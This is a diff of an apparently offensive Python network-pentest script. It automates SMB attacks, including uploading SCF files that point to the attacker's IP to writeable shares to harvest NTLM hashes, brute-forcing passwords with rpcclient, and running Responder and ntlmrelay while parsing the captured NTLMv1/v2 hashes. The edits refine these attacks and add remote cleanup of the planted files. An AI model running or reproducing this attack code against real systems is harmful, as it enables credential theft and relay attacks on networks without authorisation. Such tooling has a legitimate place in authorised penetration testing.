@@ -14,7 +14,6 @@ import netifaces
 from datetime import datetime
 from itertools import zip_longest
 from libnmap.process import NmapProcess
-from smb.SMBConnection import SMBConnection
 from asyncio.subprocess import PIPE, STDOUT
 from netaddr import IPNetwork, AddrFormatError
 from libnmap.parser import NmapParser, NmapParserException
@@ -23,7 +22,7 @@ from subprocess import Popen, PIPE, check_output, CalledProcessError
 os.environ['CPUID_DISABLE'] = '1'
 
 # debug
-#from IPython import embed
+from IPython import embed
 
 def parse_args():
     # Create the arguments
@@ -99,7 +98,7 @@ def create_scf():
     scf_filename = '@local.scf'
 
     if not os.path.isfile(scf_filename):
-        scf_data = '[Shell]\nCommand=2\nIconFile=\\\\{}\\file.ico\n[Taskbar]\nCommand=ToggleDesktop'.format(get_ip())
+        scf_data = '[Shell]\n\nCommand=2\n\nIconFile=\\\\{}\\file.ico\n\n[Taskbar]\n\nCommand=ToggleDesktop'.format(get_ip())
         write_to_file(scf_filename, scf_data, 'w+')
 
     cwd = os.getcwd()+'/'
@@ -115,6 +114,7 @@ def run_smbclient(server, share_name, action, scf_filepath):
     smb_cmds_data = 'use {}\n{} {}\nls\nexit'.format(share_name, action, scf_filepath)
     write_to_file(smb_cmds_filename, smb_cmds_data, 'w+')
     smbclient_cmd = 'python2 submodules/impacket/examples/smbclient.py {} -f {}'.format(server, smb_cmds_filename)
+    print('[*] Running: {}'.format(smbclient_cmd))
     stdout, stderr = Popen(smbclient_cmd.split(), stdout=PIPE, stderr=PIPE).communicate()
     return stdout, stderr
 
@@ -140,15 +140,16 @@ def write_scf_files(lines, ip, args):
             if 'Anonymous access:' in l or 'Current user access:' in l:
                 access = l.split()[-1]
                 if access == 'READ/WRITE':
-                    if 'scf' not in args.skip.lower():
-                        scf_filepath = create_scf()
-                        print('[+] Writeable share found at: '+share)
-                        print('[*] Attempting to write SCF file to share')
-                        action = 'put'
-                        stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)
-                        if os.path.basename(scf_filepath) in str(stdout):
-                            print('[+] Successfully wrote SCF file to: {}'.format(share))
-                            write_to_file('logs/Shares-with-SCF.txt', share+'\n', 'a+')
+                    scf_filepath = create_scf()
+                    print('[+] Writeable share found at: '+share)
+                    print('[*] Attempting to write SCF file to share')
+                    action = 'put'
+                    stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)
+                    if os.path.basename(scf_filepath) in str(stdout):
+                        print('[+] Successfully wrote SCF file to: {}'.format(share))
+                        write_to_file('logs/Shares-with-SCF.txt', share+'\n', 'a+')
+                    elif stderr != b'':
+                        print('[-] Error writing SCF file: {}'.format(stderr))
 
 def parse_nse(hosts, args):
     '''
@@ -158,6 +159,7 @@ def parse_nse(hosts, args):
 
     if 'scf' not in args.skip.lower():
         print('[*] Attack 2: SCF file upload to anonymously writeable shares for hash collection')
+
 
     for host in hosts:
         ip = host.address
@@ -169,10 +171,11 @@ def parse_nse(hosts, args):
                     smb_signing_disabled_hosts.append(ip)
 
             # ATTACK 2: SCF file upload for hash capture
-            if script_out['id'] == 'smb-enum-shares':
-                lines = script_out['output'].splitlines()
-                write_scf_files(lines, ip, args)
-                local_scf_cleanup()
+            if 'scf' not in args.skip.lower():
+                if script_out['id'] == 'smb-enum-shares':
+                    lines = script_out['output'].splitlines()
+                    write_scf_files(lines, ip, args)
+                    #local_scf_cleanup()
 
     if len(smb_signing_disabled_hosts) > 0:
         for host in smb_signing_disabled_hosts:
@@ -264,7 +267,13 @@ def create_cmds(hosts, cmd):
     cmd looks likes "echo {} && rpcclient ... {}"
     '''
     commands = []
-    for ip in hosts:
+    for host in hosts:
+        # Most of the time host will be Nmap object but in case of null_sess_hosts
+        # it will be a list of strings (ips)
+        if type(host) is str:
+            ip = host
+        else:
+            ip = host.address
         formatted_cmd = 'echo {} && '.format(ip) + cmd.format(ip)
         commands.append(formatted_cmd)
     return commands
@@ -337,8 +346,6 @@ def create_brute_cmds(ip_users, passwords):
                 print('[+] User found: ' + user)
                 rpc_user_pass = []
                 for pw in passwords:
-                    #cmds.append('echo {} && rpcclient -U \
-                    #"{}%{}" {} -c "exit"'.format(ip, user, pw, ip))
                     cmd = "echo {} && rpcclient -U \"{}%{}\" {} -c 'exit'".format(ip, user, pw, ip)
                     # This is so when you get the output from the coros
                     # you get the username and pw too
@@ -775,7 +782,6 @@ def get_and_crack_resp_hashes(args, prev_hashes, prev_pwds, prev_lines, identifi
 
     return prev_hashes, prev_pwds, new_lines
 
-
 def cleanup_resp(resp_proc, prev_pwds):
     '''
     Kill responder and move the log file
@@ -806,11 +812,13 @@ def parse_ntlmrelay_line(identifier, line, successful_auth, prev_hashes, args):
     if successful_auth == True:
         successful_auth = False
         netntlm_hash = line.split()[-1]+'\n'
+
         if netntlm_hash.count(':') == 5:
             hash_type = 'NTLMv2'
             if netntlm_hash not in prev_hashes:
                 prev_hashes.append(netntlm_hash)
                 hashes['NTLMv2'] = [netntlm_hash]
+
         if netntlm_hash.count(':') == 4:
             hash_type = 'NTLMv1'
             if netntlm_hash not in prev_hashes:
@@ -831,6 +839,44 @@ def parse_ntlmrelay_line(identifier, line, successful_auth, prev_hashes, args):
 
     return prev_hashes, successful_auth
 
+def remote_scf_cleanup():
+    '''
+    Deletes the scf file from the remote shares
+    '''
+    path = 'logs/Shares-with-SCF.txt'
+    if os.path.isfile(path):
+        with open(path) as f:
+            lines = f.readlines()
+            for l in lines:
+                # Returns '['', '', '10.1.1.0', 'path/to/share\n']
+                split_line = l.split('\\', 3)
+                ip = split_line[2]
+                share_folder = split_line[3].strip()
+                action = 'rm'
+                scf_filepath = '@local.scf'
+                stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)
+
+def cleanup_hash_files():
+    '''
+    Puts all the hash files of each type into one file
+    '''
+    ntlm_files = []
+    for fname in os.listdir(os.getcwd()):
+        if re.search('NTLMv(1|2)-hashes-.*\.txt', fname):
+            ntlm_files.append(fname)
+
+    for fname in ntlm_files:
+        if 'v1' in fname:
+            v1_file = open('NTLMv1-hashes.txt', 'a+')
+            with open(fname) as infile1:
+                v1_file.write(infile1.read())
+                os.rename(fname, 'logs/'+fname)
+        elif 'v2' in fname:
+            with open(fname) as infile2:
+                v2_file = open('NTLMv2-hashes.txt', 'a+')
+                v2_file.write(infile2.read())
+                os.rename(fname, 'logs/'+fname)
+
 def do_ntlmrelay(identifier, prev_hashes, prev_pwds, args):
     '''
     Continuously monitor and parse ntlmrelay output
@@ -845,27 +891,18 @@ def do_ntlmrelay(identifier, prev_hashes, prev_pwds, args):
         '''
         print('\n[-] CTRL-C caught, cleaning up and closing')
 
+        # Kill procs
         cleanup_resp(resp_proc, prev_pwds)
         ntlmrelay_proc.kill()
 
         # Cleanup hash files
-        ntlm_files = []
-        for fname in os.listdir(os.getcwd()):
-            if re.search('NTLMv(1|2)-hashes-.*\.txt', fname):
-                ntlm_files.append(fname)
+        cleanup_hash_files()
 
-        for fname in ntlm_files:
-            if 'v1' in fname:
-                v1_file = open('NTLMv1-hashes.txt', 'a+')
-                with open(fname) as infile1:
-                    v1_file.write(infile1.read())
-                    os.rename(fname, 'logs/'+fname)
-            elif 'v2' in fname:
-                with open(fname) as infile2:
-                    v2_file = open('NTLMv2-hashes.txt', 'a+')
-                    v2_file.write(infile2.read())
-                    os.rename(fname, 'logs/'+fname)
+        # Clean up SCF file
+        remote_scf_cleanup()
+
         sys.exit()
+
     signal.signal(signal.SIGINT, signal_handler)
     ########## CTRL-C HANDLER ##############################
 
@@ -928,6 +965,8 @@ def main(report, args):
     prev_pwds = []
     loop = asyncio.get_event_loop()
 
+    # Returns a list of Nmap object hosts
+    # So you must use host.address, for example, to get the ip
     hosts = get_hosts(args, report)
 
     if len(hosts) > 0:
